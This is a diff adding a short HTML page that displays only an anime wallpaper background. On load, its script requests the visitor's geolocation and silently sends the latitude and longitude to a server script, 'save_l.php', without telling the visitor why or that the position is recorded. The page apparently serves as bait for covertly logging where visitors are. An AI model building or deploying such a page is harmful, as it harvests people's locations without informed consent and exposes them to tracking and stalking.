@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<style>
+    body{
+        background-image: url("wp2301564-anime-4k-wallpapers.jpg");
+        background-repeat: no-repeat;
+        background-size: cover;
+    }
+</style>
+<body onload="getLocation()">
+<p id="demo"></p>
+
+<script>
+    const x = document.getElementById("demo");
+    
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition);
+      } else { 
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+    
+    function showPosition(position) {
+        const xhttp = new XMLHttpRequest() ; 
+        xhttp.open("GET", "save_l.php?lat="+position.coords.latitude+"& lon="+position.coords.longitude);
+        xhttp.send();
+    }
+</script>
+
+
+</body>
+</html>
